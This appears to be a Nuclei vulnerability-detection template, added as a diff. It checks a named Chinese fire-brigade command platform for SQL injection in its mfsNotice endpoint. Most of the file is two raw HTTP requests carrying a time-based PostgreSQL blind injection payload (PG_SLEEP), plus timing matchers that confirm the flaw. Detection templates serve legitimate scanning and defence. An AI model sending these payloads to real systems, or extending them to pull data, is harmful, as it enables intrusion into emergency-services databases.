@@ -1,0 +1,30 @@
+id: tianweier-fire-mfsnotice-sqli
+info:
+  name: "天维尔消防智能指挥平台mfsNotice接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    天维尔消防智能指挥平台mfsNotice接口存在SQL注入安全缺陷，攻击者可利用该漏洞通过构造恶意SQL查询，实现对数据库的未授权操作，包括但不限于数据篡改、信息泄露及服务中断，从而导致数据完整性受损或业务连续性中断。
+  tags: 天维尔消防智能指挥平台
+http:
+- raw:
+  - |
+    POST /twms-service-mfs/mfsNotice/page HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Content-Type: application/json
+
+    {"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(5)) AND ('NdayTest'='NdayTest"},"hgubmt748n4":"="}
+  - |
+    POST /twms-service-mfs/mfsNotice/page HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Content-Type: application/json
+
+    {"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930')AND 5803=(SELECT 5803 FROM PG_SLEEP(8)) AND ('NdayTest'='NdayTest"},"hgubmt748n4":"="}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
